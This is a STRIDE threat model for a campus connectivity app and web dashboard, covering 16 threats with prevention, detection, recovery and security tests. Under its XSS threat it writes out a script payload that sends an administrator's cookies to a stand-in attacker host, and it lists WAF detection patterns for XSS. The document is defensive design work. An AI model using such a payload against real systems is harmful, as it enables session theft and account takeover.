# Campus Connect — Threat Model

## 1. Threat Modeling Methodology & Framework

This threat model uses the industry-standard **STRIDE** methodology (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) developed by Microsoft, coupled with a standardized **Risk Rating Matrix** based on **Likelihood** and **Impact** (derived from OWASP Risk Rating Methodology and CVSS v3.1 principles).

### 1.1 STRIDE Definitions
- **Spoofing (S):** Impersonating a user, device, or system component (e.g., student identity forgery, fake device submission).
- **Tampering (T):** Modifying telemetry, database records, transit packets, or configuration files (e.g., injecting fraudulent speed tests).
- **Repudiation (R):** Denying performed actions due to insufficient audit trails (e.g., administrator altering zone boundaries without logging).
- **Information Disclosure (I):** Exposing private student reading histories, raw locations, or internal infrastructure details.
- **Denial of Service (D):** Degrading or exhausting system availability (e.g., flooding batch uploads, ReDoS, database connection starvation).
- **Elevation of Privilege (E):** Gaining unauthorized administrative or system capabilities (e.g., student accessing `/admin/issues`).

### 1.2 Risk Rating Matrix

```text
+-------------------+---------------------------------------------------+
|                   |                      IMPACT                       |
|    LIKELIHOOD     +---------------+-----------------+-----------------+
|                   | Low           | Medium          | High / Critical |
+-------------------+---------------+-----------------+-----------------+
| High              | Medium        | High            | CRITICAL        |
| Medium            | Low           | Medium          | High            |
| Low               | Low           | Low             | Medium          |
+-------------------+---------------+-----------------+-----------------+
```

---

## 2. System Decomposition & Attack Surface

The attack surface of Campus Connect spans four primary operational environments:
1. **Mobile Application Attack Surface:** Local Android storage (Room SQLite), IPC boundaries (Broadcast Receivers, Activities, WorkManager), reverse-engineering of APK binaries, device-level network proxying.
2. **Web Dashboard Attack Surface:** Browser runtime, DOM manipulation, Cross-Site Scripting (XSS), session hijacking, Clickjacking, third-party JavaScript asset dependencies.
3. **API & Gateway Attack Surface:** REST API endpoints (`/api/v1/*`), HTTP header processing, JSON payload deserialization, rate-limiting gates, authentication middleware.
4. **Data & Cloud Infrastructure Attack Surface:** PostgreSQL database network port, Redis cache/queue, container runtimes, secret vaults, cloud storage backup buckets.

---

## 3. Comprehensive STRIDE Threat Matrix (16 Core Threat Categories)

---

### Threat 01: Unauthorized Users
- **STRIDE Category:** Spoofing / Elevation of Privilege
- **Asset Affected:** All protected API endpoints, student reading histories, campus aggregate datasets.
- **Attack Scenario:** An unauthenticated external attacker scans the public network, discovers the `/api/v1/readings` and `/api/v1/readings/mine` endpoints, and attempts to invoke them without credentials, with forged bearer tokens, or by attempting token replay attacks.
- **Likelihood:** High
- **Impact:** High
- **Risk Rating:** High
- **Prevention:**
  - Mandatory JWT signature verification on all non-public routes using public key sets (JWKS) with asymmetric cryptography (`RS256` / `ES256`).
  - Rejection of tokens with algorithm `none` or symmetric keys (`HS256`).
  - Validation of `exp` (15-minute ceiling), `nbf`, `iss` (strict identity provider URL matching), and `aud` (`campus-connect-api`).
- **Detection:**
  - Web Application Firewall (WAF) logs matching HTTP 401 response spikes.
  - API Gateway structured audit logs recording `AUTHN_FAILURE` with source IP, attempted path, and user-agent string.
- **Recovery:**
  - Automated edge IP rate-limiting / temporary blocking (fail2ban / WAF challenge rule).
  - Invalidate leaked signing keys and trigger key rotation if token forgery is suspected.
- **Security Test Required:**
  - Execute automated test suite verifying that every protected endpoint returns HTTP `401 Unauthorized` when called with: (a) no token, (b) expired token, (c) token signed with untrusted key, (d) token with `alg: "none"`, (e) token with mismatched audience.

---

### Threat 02: Malicious Students
- **STRIDE Category:** Tampering / Information Disclosure
- **Asset Affected:** Heatmap data integrity, zone connectivity health scores, issue report queue.
- **Attack Scenario:** A student with valid authentication attempts to distort campus connectivity analytics by writing an automated script to submit 10,000 fraudulent readings with zero download speed and extreme latency for a specific building to falsely simulate poor network coverage or an outage.
- **Likelihood:** High
- **Impact:** Medium
- **Risk Rating:** High
- **Prevention:**
  - Strict per-user rate limiting (e.g., maximum 10 readings per minute, 50 readings per batch, max 3 batches per 15 minutes).
  - Schema-level range checks (speeds $>0$ and $\le 10,000$ Mbps, latency $\ge 0$ and $\le 60,000$ ms).
  - Anomaly detection scoring: Outlier readings from a single device are marked `FLAGGED` and excluded from the public aggregate computation.
  - Aggregation engine uses **medians** and interquartile ranges (IQR) rather than arithmetic means to nullify outlier influence.
  - Enforce minimum distinct contributor thresholds ($k \ge 5$ readings across $\ge 3$ devices) before status is rendered.
- **Detection:**
  - Real-time ingestion heuristics flagging statistical deviations in submission velocity from a single `user_id`.
  - Alert triggered when a single student accounts for $>40\%$ of all readings in a zone over a 1-hour window.
- **Recovery:**
  - Flag or reject fraudulent records (`validation_status = 'REJECTED'`).
  - Recompute affected zone aggregates via the background worker.
  - Administratively suspend abusive student account.
- **Security Test Required:**
  - Fuzzing and synthetic load test: Submit 1,000 extreme outlier readings from one authenticated account and verify that (a) rate limits trigger `429 Too Many Requests`, (b) outlier records receive `FLAGGED` status, (c) published zone medians remain unaffected.

---

### Threat 03: Compromised Student Accounts
- **STRIDE Category:** Spoofing / Information Disclosure
- **Asset Affected:** Student personal reading history (`/readings/mine`), monitoring sessions, personal issue reports.
- **Attack Scenario:** An attacker obtains a student's session token or campus SSO password via phishing or a public computer credential leak, accesses the student's account, reviews past reading timestamps/zones to infer physical habits, and submits spam issue reports.
- **Likelihood:** Medium
- **Impact:** Medium
- **Risk Rating:** Medium
- **Prevention:**
  - Short token lifetimes (15 minutes for access tokens).
  - Single-use rotating refresh tokens with automatic reuse detection that invalidates the entire token family.
  - Zero storage of persistent hardware identifiers (IMEI, IMSI, MAC) or precise GPS coordinates in reading records; history only reveals broad campus zones.
  - Campus SSO enforces Multi-Factor Authentication (MFA).
- **Detection:**
  - Anomaly detection for simultaneous logins from disparate geographic regions or divergent IP subnets within a 5-minute window.
  - Audit logging of password resets and refresh token invalidation events.
- **Recovery:**
  - Instant session termination via Redis-backed token blacklist or database token revocation timestamp (`users.tokens_revoked_at`).
  - Mandatory password reset through Identity Provider.
- **Security Test Required:**
  - Automated session test: Generate refresh token $T_1$, refresh to obtain $T_2$, then attempt to replay $T_1$. Verify that the API rejects $T_1$ and immediately revokes $T_2$ and associated sessions.

---

### Threat 04: Malicious Administrators
- **STRIDE Category:** Elevation of Privilege / Tampering / Repudiation
- **Asset Affected:** Campus zone definitions, issue report statuses, administrative audit trail.
- **Attack Scenario:** A compromised or rogue campus administrator attempts to cover up chronic connectivity issues in an administrative building by modifying zone geometries, deleting user issue reports, or altering aggregate statuses.
- **Likelihood:** Low
- **Impact:** High
- **Risk Rating:** Medium
- **Prevention:**
  - Least privilege: Campus administrators have permissions restricted to zone configuration and issue moderation; they have **no SQL permissions** to modify raw readings or database schemas.
  - Immutable, append-only administrative audit log table with row-level cryptographic hash chaining.
  - Soft-deletes only: System prohibits physical deletion (`DELETE`) on zones and issue reports by campus administrators.
  - Dual-custody / peer approval workflow required for deactivating critical campus zones or modifying system-wide thresholds.
- **Detection:**
  - Real-time audit alerts pushed to system administrators for all state modifications on zones or bulk issue closures.
  - Daily automated audit verification job validating cryptographic integrity of the audit log chain.
- **Recovery:**
  - Roll back unauthorized zone configuration changes using database audit history.
  - Revoke administrative privileges immediately via system admin role management.
- **Security Test Required:**
  - Privilege boundary test: Authenticate as `campus_admin` and attempt to execute `DELETE` against `/admin/issues/:id` or call `/api/v1/users/:id/role`. Verify that the API returns HTTP `403 Forbidden`.

---

### Threat 05: Stolen Android Devices
- **STRIDE Category:** Information Disclosure / Tampering
- **Asset Affected:** Local Room SQLite database, cached authentication tokens, queued offline readings.
- **Attack Scenario:** An attacker physically steals a student's unlocked or weakly protected Android device, connects via ADB or root file managers, and extracts the application sandbox to inspect stored connectivity records and authentication tokens.
- **Likelihood:** Medium
- **Impact:** Low
- **Risk Rating:** Low
- **Prevention:**
  - Room database encrypted at rest using **SQLCipher**.
  - Encryption key generated via Android Keystore and secured with `MasterKey` in `EncryptedSharedPreferences`.
  - Android application sets `android:allowBackup="false"` in `AndroidManifest.xml` to prevent ADB backup extraction.
  - Immediate local purge: Readings in state `UPLOADED` are pruned from local storage within 24 hours.
  - Zero storage of IMEI, IMSI, phone numbers, contacts, or precise GPS in the local database.
- **Detection:**
  - Operating system device lock failures (OS-level).
  - Server-side token expiration (access token expires in 15 minutes; refresh token invalidation via remote logout).
- **Recovery:**
  - Student initiates remote account session termination from the web dashboard.
  - Revoke all active refresh tokens for the user in the identity provider.
- **Security Test Required:**
  - Physical extraction test: Root an emulator running the release build, extract `/data/data/edu.campusconnect.app/databases/`, and verify that SQLite inspection tools fail to read database contents without the Keystore key.

---

### Threat 06: API Abuse and Automated Attacks
- **STRIDE Category:** Denial of Service / Tampering
- **Asset Affected:** API gateway compute capacity, database CPU and I/O, network bandwidth.
- **Attack Scenario:** A botnet or script-kiddie targets the `/readings/batch` endpoint with millions of requests per second containing randomized, invalid, or oversized JSON payloads to exhaust backend server resources and crash the service.
- **Likelihood:** High
- **Impact:** High
- **Risk Rating:** High
- **Prevention:**
  - Edge WAF with automated DDoS mitigation and bot-challenge protection (Cloudflare / AWS Shield).
  - Strict payload size limits enforced at reverse proxy and Express middleware (`express.json({ limit: '100kb' })`).
  - Tiered rate limiting via Redis token bucket (per-IP and per-user limits).
  - Maximum batch size enforced at 50 readings per request.
  - Early rejection of invalid `Content-Type` headers before body parsing.
- **Detection:**
  - Prometheus metrics tracking ingestion request rates, 429 response codes, and Redis rate-limiter queue saturation.
  - Alert triggered if API CPU utilization exceeds 75% for $>3$ consecutive minutes.
- **Recovery:**
  - WAF automatically blocks offensive IP subnets.
  - Autoscaling spawns additional Express worker instances behind the load balancer.
- **Security Test Required:**
  - Stress and rate-limit test: Benchmark `/readings/batch` with a concurrency of 200 users using Locust / k6. Verify that rate limiting triggers reliably at 5 requests/min per student, and memory/CPU remain stable.

---

### Threat 07: Database Compromise
- **STRIDE Category:** Information Disclosure / Tampering / Elevation of Privilege
- **Asset Affected:** Entire PostgreSQL relational database, all student telemetry, user records, configuration.
- **Attack Scenario:** An attacker discovers an unescaped query parameter in a reporting filter or an exposed database port on the public internet, executes arbitrary SQL injection (SQLi) or brute-forces database credentials, and dumps the entire database.
- **Likelihood:** Low
- **Impact:** Critical
- **Risk Rating:** High
- **Prevention:**
  - Parameterized queries and type-safe query builders (e.g., Kysely / Prisma / pg with `$1, $2` parameters) exclusively. Strict ban on raw string concatenation in SQL.
  - Database resides in an isolated private VPC subnet with **zero public IP access**. Connections permitted only from verified API container security groups on port 5432.
  - PostgreSQL role separation: Application connects as `cc_api_user` with restricted DML privileges (no DDL, no superuser).
  - PostgreSQL Row-Level Security (RLS) active on all primary data tables.
  - Strong, automated secrets management (vault-generated 64-character SCRAM-SHA-256 passwords).
- **Detection:**
  - `pgaudit` extension logging all unexpected syntax errors, schema introspection queries (`information_schema`), or bulk table scans.
  - Cloud provider VPC network flow logs detecting unauthorized port 5432 connection attempts.
- **Recovery:**
  - Immediate network isolation of affected database instance.
  - Restore database to an uncompromised state using point-in-time recovery (PITR) from immutable cloud backups.
  - Rotate all database credentials and application secrets immediately.
- **Security Test Required:**
  - Automated SQL injection fuzzing: Run OWASP ZAP and sqlmap across all REST API query parameters (`from`, `to`, `metric`, `networkType`, `zoneId`, `page`, `pageSize`) ensuring 100% parameterization verification.

---

### Threat 08: Credential Stuffing and Brute Force
- **STRIDE Category:** Spoofing / Elevation of Privilege
- **Asset Affected:** Identity Provider authentication service, student and administrator accounts.
- **Attack Scenario:** An attacker acquires a database dump of leaked credentials from a public breach and runs automated brute-force credential stuffing against the campus login portal to compromise student and staff accounts.
- **Likelihood:** High
- **Impact:** High
- **Risk Rating:** High
- **Prevention:**
  - Delegation of authentication to an enterprise Identity Provider (Supabase Auth / Azure AD) featuring built-in compromised credential checking and adaptive MFA.
  - Progressive login delays (exponential backoff) and CAPTCHA / bot-challenge triggering after 3 consecutive failed attempts from an IP or targeting an account.
  - Account lockout after 5 failed attempts within 15 minutes.
  - Enforce minimum password complexity (NIST SP 800-63B guidelines: $\ge 12$ characters, screened against HaveIBeenPwned breach lists).
- **Detection:**
  - Identity provider security telemetry monitoring failed authentication spikes.
  - SIEM alerts correlating multiple failed logins across diverse accounts from unified IP clusters.
- **Recovery:**
  - Automated locking of targeted accounts with email notifications instructing users to verify identity and reset credentials.
  - WAF IP block on offending infrastructure.
- **Security Test Required:**
  - Brute force simulation: Execute 10 consecutive failed login attempts against a test account and verify that account lockout and IP throttling engage on attempt 4.

---

### Threat 09: Data Scraping and Enumeration
- **STRIDE Category:** Information Disclosure
- **Asset Affected:** Campus connectivity heatmaps, zone metadata, temporal usage patterns.
- **Attack Scenario:** A commercial entity or competitor sets up headless browser scrapers to continuously enumerate `/campuses/:id/heatmap` and `/zones/:id/analytics` across all parameters every 5 seconds to reconstruct campus building utilization schedules and student presence patterns.
- **Likelihood:** High
- **Impact:** Medium
- **Risk Rating:** Medium
- **Prevention:**
  - Rate limiting on public and viewer aggregate endpoints (e.g., 60 requests/minute per IP).
  - Aggregation time windowing: Data is quantised into hourly and daily historical buckets; no sub-minute real-time feeds are exposed.
  - $k$-Anonymity threshold ($k \ge 5$ samples from $\ge 3$ distinct devices) prevents de-anonymizing low-traffic zones.
  - Obfuscation of internal database auto-increment IDs: All entity IDs are randomly generated UUIDv4.
- **Detection:**
  - Access log analytics identifying scraping patterns (systematic traversal of UUIDs, high request cadence, static headless user-agents).
- **Recovery:**
  - Challenge scraper bots via Cloudflare Managed Challenge / Turnstile.
  - Throttle offending IP ranges to 1 request/minute.
- **Security Test Required:**
  - Enumeration test: Script a sequential crawler attempting to query 1,000 zone analytics variations within 60 seconds; verify edge rate limits throttle the crawler and response latency degrades gracefully.

---

### Threat 10: Injection and Cross-Site Scripting (XSS)
- **STRIDE Category:** Tampering / Information Disclosure
- **Asset Affected:** Web dashboard browser sessions, campus administrator consoles, database integrity.
- **Attack Scenario:** A student submits an issue report via `POST /issues` containing a malicious JavaScript payload in the `description` field: `<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>`. A campus administrator opens the web dashboard issue moderation screen, and the script executes in the context of the admin's session.
- **Likelihood:** Medium
- **Impact:** High
- **Risk Rating:** High
- **Prevention:**
  - Context-aware UI auto-escaping in React (JSX).
  - Prohibit `dangerouslySetInnerHTML` across all web dashboard components.
  - Server-side input validation and sanitization using DOMPurify with HTML-entity stripping before persisting text fields.
  - Strict Content Security Policy (CSP Level 3): `script-src 'self'`, prohibiting `unsafe-inline` and `unsafe-eval`.
  - Session tokens stored in in-memory variables (not `localStorage`), and refresh tokens stored in `HttpOnly` cookies, preventing JavaScript cookie theft.
- **Detection:**
  - Browser CSP violation reports posted to `/api/v1/security/csp-reports`.
  - WAF inspection rules detecting common XSS patterns (`<script>`, `onerror=`, `javascript:`) in request bodies.
- **Recovery:**
  - Invalidate administrator session immediately.
  - Sanitize or delete the malicious issue report in the database.
- **Security Test Required:**
  - Automated XSS test suite: Submit polyglot XSS strings across all text fields (`issue_reports.description`, `zones.description`, `campuses.name`), render them in the web dashboard, and verify that zero script execution occurs and CSP violation is logged.

---

### Threat 11: Broken Object-Level & Function-Level Authorization (BOLA & BFLA)
- **STRIDE Category:** Elevation of Privilege / Information Disclosure / Tampering
- **Asset Affected:** Monitoring sessions, student personal reading history, administrative zone controls.
- **Attack Scenario:**
  - *BOLA Scenario:* Student A inspects HTTP traffic, observes their own session stop request `POST /monitoring/sessions/{idA}/stop`, and changes the UUID to `{idB}` belonging to Student B to forcibly terminate Student B's active monitoring session.
  - *BFLA Scenario:* Student A directly calls `PATCH /admin/zones/{zoneId}` with a regular student JWT to alter a campus zone name or status.
- **Likelihood:** High
- **Impact:** High
- **Risk Rating:** High
- **Prevention:**
  - **BOLA Defense:** Object-level ownership check enforced in every query:
    ```sql
    UPDATE monitoring_sessions 
    SET status = 'STOPPED', ended_at = NOW() 
    WHERE id = $1 AND user_id = $2; -- $2 is verified token subject!
    ```
  - **BFLA Defense:** Centralized, declarative RBAC middleware attached to router definitions:
    ```typescript
    router.patch('/admin/zones/:zoneId', 
      requireAuth, 
      requireRole(['campus_admin', 'system_admin']), 
      adminZoneHandler
    );
    ```
- **Detection:**
  - Security audit logs recording `AUTHZ_FAILURE` with metadata indicating a user attempted to manipulate a foreign resource ID.
  - Alert triggered on repeated BOLA/BFLA failures from the same user account ($>3$ within 10 minutes).
- **Recovery:**
  - Revoke token and suspend the offending user account pending investigation.
- **Security Test Required:**
  - BOLA/BFLA test suite:
    1. Authenticate User A and User B. Create monitoring session for User B. Attempt to stop User B's session using User A's token. Verify response is `403 Forbidden` or `404 Not Found`.
    2. Call every `/admin/*` route using a valid student token. Verify 100% of routes return `403 Forbidden`.

---

### Threat 12: Denial of Service & Resource Exhaustion
- **STRIDE Category:** Denial of Service
- **Asset Affected:** Node.js event loop availability, PostgreSQL database connections, server memory.
- **Attack Scenario:**
  - *ReDoS:* Attacker sends a specially crafted, deeply nested regex string in `appVersion` or `carrierLabel` causing polynomial backtracking in unanchored regular expressions, locking the Node.js single-threaded event loop.
  - *Memory Exhaustion:* Attacker sends large JSON arrays causing out-of-memory (OOM) process termination.
- **Likelihood:** Medium
- **Impact:** High
- **Risk Rating:** High
- **Prevention:**
  - Strict linear regex patterns (`^[\w\.\-]+$`) verified with safe regex testing tools (e.g., `safe-regex` / linter rules against catastrophic backtracking).
  - Explicit length limits on all string inputs in Zod schemas (`max(32)` or `max(255)`).
  - `express.json({ limit: '100kb' })` middleware rejects payloads exceeding memory safety limits.
  - Database connection pooling managed via PgBouncer with hard connection limits and statement timeouts (`statement_timeout = 5000` ms).
- **Detection:**
  - APM (Application Performance Monitoring) tracking event loop delay (lag $>50$ ms triggers alert).
  - HTTP 504 Gateway Timeout spikes indicating unresponsive upstream Node.js workers.
- **Recovery:**
  - Process supervisor (Docker / Kubernetes) automatically terminates and restarts unhealthy worker containers via liveness probe failures.
- **Security Test Required:**
  - ReDoS fuzzing: Pass evil regex payload strings (e.g., `a` repeated 50,000 times ending in `!`) to all regex-validated fields; verify that response time does not exceed 100 ms and event loop delay remains unaffected.

---

### Threat 13: Dependency & Supply-Chain Compromise
- **STRIDE Category:** Tampering / Information Disclosure / Elevation of Privilege
- **Asset Affected:** Server backend runtime, Android APK binary, Web dashboard bundle.
- **Attack Scenario:** A malicious package update is pushed to a commonly used npm or Gradle dependency (e.g., through developer account hijacking or typosquatting) containing an obfuscated backdoor that exfiltrates environment secrets and database credentials to an external server.
- **Likelihood:** Medium
- **Impact:** Critical
- **Risk Rating:** High
- **Prevention:**
  - Deterministic package lockfiles (`package-lock.json`, Gradle verification metadata) committed and verified on every build.
  - Automated Software Composition Analysis (SCA) running in CI/CD via `npm audit --audit-level=high`, Snyk, and OWASP Dependency-Check.
  - Minimal dependency footprint: Prohibit unnecessary utility libraries (e.g., avoid importing full `lodash` for simple operations).
  - Dependency pinning: Major version floating (`*` or `^`) is prohibited in production dependencies.
- **Detection:**
  - Continuous vulnerability monitoring alerts from GitHub Dependabot.
  - Egress network filtering: Production containers operate in a private VPC with strict outbound security groups blocking unauthorized connections to unknown external IPs.
- **Recovery:**
  - Roll back to last verified immutable container release artifact.
  - Pin compromised library to known-good version and redeploy.
  - Rotate all infrastructure secrets and database passwords if credential exfiltration is suspected.
- **Security Test Required:**
  - CI dependency gate: Execute `npm audit` and Gradle dependency validation in CI; verify that any introduced package with CVSS $\ge 7.0$ fails the build.

---

### Threat 14: Misconfigured Cloud Infrastructure
- **STRIDE Category:** Information Disclosure / Tampering
- **Asset Affected:** Cloud servers, storage buckets, database ports, environment variables.
- **Attack Scenario:** During infrastructure provisioning, an engineer leaves PostgreSQL port 5432 exposed to `0.0.0.0/0`, or configures an S3/GCS bucket containing application backups with public read permissions (`allUsers: roles/storage.objectViewer`).
- **Likelihood:** Medium
- **Impact:** Critical
- **Risk Rating:** High
- **Prevention:**
  - Infrastructure as Code (IaC) using Terraform / Pulumi with automated linting via `trivy` and `checkov`.
  - Cloud storage buckets configured with mandatory **Public Access Prevention (PAP)** enforced at the project level.
  - Database provisioned within private subnets with no public IPv4 address and strict security group ingress restricted to backend container IP CIDRs.
  - Default deny-all egress network policies on container clusters.
- **Detection:**
  - Cloud security posture management (CSPM) tools scanning for public bucket ACLs or open ingress security group rules.
  - Port-scanning telemetry alerting on open external ports.
- **Recovery:**
  - Automated remediation scripts immediately apply public access blocks to exposed buckets and close rogue firewall rules.
  - Audit access logs to determine if unauthorized downloads occurred during exposure.
- **Security Test Required:**
  - Network and configuration audit: Execute an external Nmap port scan against the production domain and verify that only ports 80 and 443 are open, and attempt anonymous HTTP GET against cloud backup storage buckets verifying `403 Forbidden`.

---

### Threat 15: Backup Theft and Accidental Data Exposure
- **STRIDE Category:** Information Disclosure
- **Asset Affected:** PostgreSQL database backups, WAL logs, staging/testing environments.
- **Attack Scenario:** A daily database backup file (`campusconnect_dump.sql.gz`) is stored unencrypted in an accessible storage volume or transferred to a non-production staging environment where permissions are loose, allowing unauthorized developers or third parties to extract raw student readings and user records.
- **Likelihood:** Low
- **Impact:** High
- **Risk Rating:** Medium
- **Prevention:**
  - Automated backups are encrypted client-side using **AES-256-GCM envelope encryption** with a customer-managed key (KMS) before writing to object storage.
  - Strict prohibition against restoring production dumps into development or staging environments. Staging databases must be seeded with synthetically generated mock data only.
  - Immutable backup storage (Bucket Lock / Object Lock with WORM retention policy) preventing backup deletion or modification by compromised accounts.
- **Detection:**
  - Cloud IAM audit logging tracking `storage.objects.get` calls on backup buckets.
  - Alerts triggered on backup download requests originating outside authorized CI/CD or disaster recovery service accounts.
- **Recovery:**
  - Rotate KMS backup encryption keys.
  - Execute audit log investigation to determine exposure scope and notify institution Data Protection Officer if PII was impacted.
- **Security Test Required:**
  - Backup encryption verification: Download an encrypted backup artifact directly and verify that standard decompression and SQL parsing fail completely without the KMS decryption key.

---

### Threat 16: Insider Threats
- **STRIDE Category:** Information Disclosure / Tampering / Elevation of Privilege
- **Asset Affected:** Application source code, database tables, encryption keys, production infrastructure.
- **Attack Scenario:** A rogue system administrator or disgruntled software engineer with infrastructure access uses their credentials to dump raw student readings, plant a secret backdoor in the codebase, or alter historical aggregate analytics.
- **Likelihood:** Low
- **Impact:** Critical
- **Risk Rating:** High
- **Prevention:**
  - Separation of duties: Developers do not possess production database credentials or direct SSH access to production containers.
  - Mandatory peer review (two-person rule) and branch protection on `main` branch; no direct code pushes permitted.
  - Ephemeral, audited access for production emergencies (Just-In-Time access via Teleport or AWS IAM Identity Center with session recording).
  - Production database queries executed via audited Bastion with full query text logging.
- **Detection:**
  - Centralized audit logging capturing all bastion sessions, IAM privilege elevations, and database superuser queries.
  - Anomaly detection flagging high-volume `SELECT * FROM readings` executed by administrative accounts.
- **Recovery:**
  - Immediate revocation of insider IAM credentials and SSH certificates.
  - Roll back source code to the last cryptographically signed Git commit tag.
- **Security Test Required:**
  - Access control verification: Confirm that developer IAM roles lack permissions to view production database secrets or bypass Git branch protection rules.
